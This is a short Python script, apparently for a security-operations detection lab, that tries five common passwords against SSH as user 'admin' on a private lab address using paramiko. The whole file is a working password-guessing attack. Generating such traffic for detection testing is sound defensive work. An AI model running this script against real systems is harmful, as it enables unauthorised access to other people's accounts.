#!/usr/bin/env python3
"""
Brute Force Attack Simulator
SOC Detection Lab - Educational Use Only
"""
import paramiko
import time

TARGET_IP = "192.168.56.101"
USERNAME = "admin"
PASSWORDS = ["password", "123456", "admin", "root", "letmein"]

def simulate_brute_force():
    print(f"[*] Starting brute force simulation against {TARGET_IP}")
    for password in PASSWORDS:
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(TARGET_IP, username=USERNAME, 
                         password=password, timeout=3)
            print(f"[+] SUCCESS: {password}")
            client.close()
            break
        except:
            print(f"[-] Failed: {password}")
            time.sleep(0.5)

if __name__ == "__main__":
    simulate_brute_force()
